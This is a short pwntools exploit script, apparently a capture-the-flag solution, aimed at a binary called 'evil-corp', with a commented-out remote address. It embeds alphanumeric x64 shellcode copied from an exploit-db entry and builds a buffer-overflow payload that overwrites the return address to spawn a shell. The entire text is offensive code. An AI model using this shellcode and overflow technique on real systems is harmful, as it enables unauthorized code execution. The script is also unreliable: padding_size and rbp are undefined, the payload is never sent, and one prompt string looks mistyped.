from pwn import *

io = process('./evil-corp')
#ip, port = '142.93.41.143', 30668
#io = remote(ip, port)
gdb.attach(io, 'continue')

io.sendlineafter('Username: ', 'eliot')
io.sendlineafter('Username: : ', '4007')

#shellcode = asm(shellcraft.sh())
#https://www.exploit-db.com/exploits/35205
shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload = shellcode + 'A'*(padding_size - len(shellcode)) + p64(int(rbp, 16)-96)
io.interactive()

